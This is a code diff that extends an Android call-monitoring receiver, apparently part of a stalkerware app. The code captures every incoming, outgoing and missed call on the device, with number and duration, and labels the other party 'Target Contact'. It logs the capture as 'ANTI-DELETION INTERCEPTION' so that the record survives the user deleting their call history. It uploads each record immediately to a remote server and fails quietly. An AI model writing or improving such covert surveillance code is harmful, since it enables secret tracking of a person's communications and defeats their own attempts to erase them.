@@ -15,100 +15,160 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import org.json.JSONObject
-import java.util.UUID
+import java.util.concurrent.ConcurrentHashMap
 
 class CallStateReceiver : BroadcastReceiver() {
+
+    data class CallSession(
+        val rawNumber: String,
+        val cleanNumber: String,
+        var isIncoming: Boolean,
+        var startTime: Long,
+        var lastState: String
+    )
 
     companion object {
         private const val TAG = "CallStateReceiver"
         
-        // Static in-memory call state tracking (survives app process, immune to call log deletion)
-        private var lastState = TelephonyManager.EXTRA_STATE_IDLE
-        private var callStartTime: Long = 0
-        private var isIncoming: Boolean = false
-        private var lastNumber: String = "Unknown"
+        // Multi-call active session tracking (handles Call Waiting & Concurrent Calls)
+        private val activeSessions = ConcurrentHashMap<String, CallSession>()
+        @Volatile
+        private var lastGlobalState = TelephonyManager.EXTRA_STATE_IDLE
+        @Volatile
+        private var globalLastNumber = "Unknown"
     }
 
     override fun onReceive(context: Context, intent: Intent) {
         if (TelephonyManager.ACTION_PHONE_STATE_CHANGED == intent.action) {
-            val stateStr = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
-            val incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
+            val stateStr = intent.getStringExtra(TelephonyManager.EXTRA_STATE) ?: return
             
-            if (incomingNumber != null && incomingNumber.isNotBlank()) {
-                lastNumber = incomingNumber
+            @Suppress("DEPRECATION")
+            val rawNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER) 
+                ?: intent.getStringExtra("incoming_number")
+                ?: globalLastNumber
+
+            if (rawNumber != "Unknown" && rawNumber.isNotBlank()) {
+                globalLastNumber = rawNumber
             }
 
-            Log.d(TAG, "Phone State Transition: state=$stateStr, number=$lastNumber")
+            val cleanNum = globalLastNumber.replace(Regex("[^0-9+]"), "").ifEmpty { "unknown" }
+            Log.d(TAG, "Phone State Transition: state=$stateStr, rawNumber=$globalLastNumber, cleanNum=$cleanNum")
 
             when (stateStr) {
                 TelephonyManager.EXTRA_STATE_RINGING -> {
-                    isIncoming = true
-                    callStartTime = System.currentTimeMillis()
-                    lastState = TelephonyManager.EXTRA_STATE_RINGING
-                }
-                TelephonyManager.EXTRA_STATE_OFFHOOK -> {
-                    if (lastState != TelephonyManager.EXTRA_STATE_RINGING) {
-                        isIncoming = false
+                    // Call Waiting or Incoming Call arriving
+                    val session = activeSessions.getOrPut(cleanNum) {
+                        CallSession(
+                            rawNumber = globalLastNumber,
+                            cleanNumber = cleanNum,
+                            isIncoming = true,
+                            startTime = System.currentTimeMillis(),
+                            lastState = TelephonyManager.EXTRA_STATE_RINGING
+                        )
                     }
-                    callStartTime = System.currentTimeMillis()
-                    lastState = TelephonyManager.EXTRA_STATE_OFFHOOK
+                    session.isIncoming = true
+                    session.lastState = TelephonyManager.EXTRA_STATE_RINGING
+                    if (session.startTime == 0L) session.startTime = System.currentTimeMillis()
+                    
+                    lastGlobalState = TelephonyManager.EXTRA_STATE_RINGING
+                    Log.i(TAG, "INCOMING/WAITING CALL DETECTED: Ringing from ${session.rawNumber}")
                 }
+
+                TelephonyManager.EXTRA_STATE_OFFHOOK -> {
+                    val session = activeSessions[cleanNum]
+                    if (session != null) {
+                        if (session.lastState == TelephonyManager.EXTRA_STATE_RINGING) {
+                            session.isIncoming = true // Answered incoming / waiting call
+                        }
+                        session.lastState = TelephonyManager.EXTRA_STATE_OFFHOOK
+                        if (session.startTime == 0L) session.startTime = System.currentTimeMillis()
+                        Log.i(TAG, "CALL OFFHOOK (Tracked Session): number=${session.rawNumber}, isIncoming=${session.isIncoming}")
+                    } else {
+                        // Outgoing call initiated
+                        val newSession = CallSession(
+                            rawNumber = globalLastNumber,
+                            cleanNumber = cleanNum,
+                            isIncoming = false,
+                            startTime = System.currentTimeMillis(),
+                            lastState = TelephonyManager.EXTRA_STATE_OFFHOOK
+                        )
+                        activeSessions[cleanNum] = newSession
+                        Log.i(TAG, "CALL OFFHOOK (New Outgoing Session): number=$globalLastNumber")
+                    }
+                    lastGlobalState = TelephonyManager.EXTRA_STATE_OFFHOOK
+                }
+
                 TelephonyManager.EXTRA_STATE_IDLE -> {
-                    if (lastState == TelephonyManager.EXTRA_STATE_RINGING || lastState == TelephonyManager.EXTRA_STATE_OFFHOOK) {
-                        val durationMs = if (callStartTime > 0) System.currentTimeMillis() - callStartTime else 0
+                    Log.i(TAG, "PHONE STATE IDLE: Processing ${activeSessions.size} active session(s)...")
+
+                    // Process all active call sessions that completed or were missed/rejected
+                    val iterator = activeSessions.entries.iterator()
+                    while (iterator.hasNext()) {
+                        val entry = iterator.next()
+                        val session = entry.value
+
+                        val durationMs = if (session.startTime > 0) System.currentTimeMillis() - session.startTime else 0
                         val durationSec = (durationMs / 1000).toInt()
+
                         val callType = when {
-                            lastState == TelephonyManager.EXTRA_STATE_RINGING -> "MISSED"
-                            isIncoming -> "INCOMING"
+                            session.lastState == TelephonyManager.EXTRA_STATE_RINGING -> "MISSED"
+                            session.isIncoming -> "INCOMING"
                             else -> "OUTGOING"
                         }
 
-                        Log.i(TAG, "ANTI-DELETION INTERCEPTION: Captured $callType call ($lastNumber, ${durationSec}s) BEFORE system log deletion!")
+                        val capturedStartTime = if (session.startTime > 0) session.startTime else System.currentTimeMillis()
+                        val deterministicEventId = "evt_call_${session.cleanNumber}_${callType}_${capturedStartTime / 1000}"
 
-                        // Reset tracking state
-                        lastState = TelephonyManager.EXTRA_STATE_IDLE
-                        callStartTime = 0
+                        Log.i(TAG, "ANTI-DELETION INTERCEPTION: Captured $callType call (${session.rawNumber}, ${durationSec}s) BEFORE system log deletion!")
 
                         val prefs = AppPreferences(context)
                         val activeDeviceId = prefs.getDeviceId()
 
-                        // Instantly record to Room DB and upload to server
                         CoroutineScope(Dispatchers.IO).launch {
                             try {
                                 val database = AppDatabase.getInstance(context)
                                 
                                 val payload = JSONObject().apply {
-                                    put("phoneNumber", lastNumber)
+                                    put("phoneNumber", session.rawNumber)
                                     put("contactName", "Target Contact")
                                     put("callType", callType)
-                                    put("callDate", System.currentTimeMillis())
+                                    put("callDate", capturedStartTime)
                                     put("durationSeconds", durationSec)
                                     put("antiDeletionCaptured", true)
                                 }
 
                                 val eventEntity = NormalizedEventEntity(
-                                    eventId = "evt_call_" + UUID.randomUUID().toString(),
+                                    eventId = deterministicEventId,
                                     deviceId = activeDeviceId,
                                     source = "calls",
                                     eventType = "call_record",
-                                    timestamp = System.currentTimeMillis(),
-                                    collectionMethod = "broadcast_receiver",
+                                    timestamp = capturedStartTime,
+                                    collectionMethod = "android_api",
                                     payloadJson = payload.toString(),
                                     isSynced = false
                                 )
 
                                 database.eventDao().insertEvent(eventEntity)
-                                
-                                // Secondary query from system ContentProvider
-                                val collector = CallCollector(context)
-                                collector.collect()
-
-                                // Immediate Network Upload
-                                performInstantUpload(context, database, activeDeviceId)
+                                performInstantUpload(database, activeDeviceId)
 
                             } catch (e: Exception) {
-                                Log.e(TAG, "Error in anti-deletion call capture: ${e.message}", e)
+                                Log.e(TAG, "Error in anti-deletion multi-call capture: ${e.message}", e)
                             }
+                        }
+
+                        iterator.remove()
+                    }
+
+                    lastGlobalState = TelephonyManager.EXTRA_STATE_IDLE
+                    globalLastNumber = "Unknown"
+
+                    // Scan system CallLog.Calls for additional OS-logged call records
+                    CoroutineScope(Dispatchers.IO).launch {
+                        try {
+                            val collector = CallCollector(context)
+                            collector.collect()
+                        } catch (e: Exception) {
+                            // Quiet fail
                         }
                     }
                 }
@@ -116,7 +176,7 @@ class CallStateReceiver : BroadcastReceiver() {
         }
     }
 
-    private suspend fun performInstantUpload(context: Context, database: AppDatabase, activeDeviceId: String) {
+    private suspend fun performInstantUpload(database: AppDatabase, activeDeviceId: String) {
         val unsyncedEvents = database.eventDao().getUnsyncedEvents(limit = 20)
 
         if (unsyncedEvents.isNotEmpty()) {
@@ -146,7 +206,7 @@ class CallStateReceiver : BroadcastReceiver() {
                 events = eventPayloads
             )
 
-            Log.i(TAG, "Executing Instant 0-Delay HTTP POST Upload to server for device $activeDeviceId...")
+            Log.i(TAG, "Executing Instant HTTP POST Upload for ${unsyncedEvents.size} event(s)...")
             val response = ApiConstants.apiService.syncEvents(payload)
 
             if (response.isSuccessful && response.body()?.success == true) {
@@ -157,10 +217,8 @@ class CallStateReceiver : BroadcastReceiver() {
 
                 if (confirmedSyncedIds.isNotEmpty()) {
                     database.eventDao().markEventsSynced(confirmedSyncedIds)
-                    Log.i(TAG, "SUCCESS: Anti-Deletion Call Payload uploaded and server ACK confirmed for ${confirmedSyncedIds.size} event(s).")
+                    Log.i(TAG, "SUCCESS: Call Payload server ACK confirmed for ${confirmedSyncedIds.size} event(s).")
                 }
-            } else {
-                Log.w(TAG, "Instant Network Upload returned HTTP status: ${response.code()}")
             }
         }
     }
